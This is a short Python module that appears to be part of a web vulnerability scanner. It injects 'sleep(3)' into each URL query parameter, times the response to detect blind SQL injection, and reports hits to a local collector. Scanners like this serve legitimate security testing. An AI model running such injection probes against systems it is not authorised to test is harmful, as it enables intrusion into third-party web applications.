from time import time
from json import dumps

from requests import get, post, exceptions

from urllib.parse import urlparse, parse_qs


class FakeRequest(object):
    content = ''
    status_code = 0


def go(web_request):
    """Doing Attack
    :param web_request:

    requestId
    ----------------------
    method
    url
    requestBody
    requestHeaders
    type
    ----------------------

    status_code
    responseHeaders

    :return: None
    """
    o = urlparse(web_request['url'])
    query = parse_qs(o.query)
    url = o._replace(query=None).geturl()
    for k, v in query.items():
        tmp_value = v
        query[k] = 'sleep(3)'
        a1 = time()
        try:
            r = get(url, params=query, timeout=5)
        except exceptions.Timeout:
            r = FakeRequest()
        a2 = time()
        if a2 - a1 >= 3:
            print ("OK")

            urlz = 'http://localhost:8787/success'
            data = {
                'request_id': web_request['requestId'],
                'module_id': 1,
                'url': url,
                'r_type': web_request['type'],
                'query': dumps(query),
                'body': dumps(query),
                'request_headers': dumps(web_request['requestHeaders']),
                'response_headers': dumps(web_request['responseHeaders']),
                'response_body': r.content,
                'response_status': r.status_code,
            }
            post(urlz, data=data)

        query[k] = tmp_value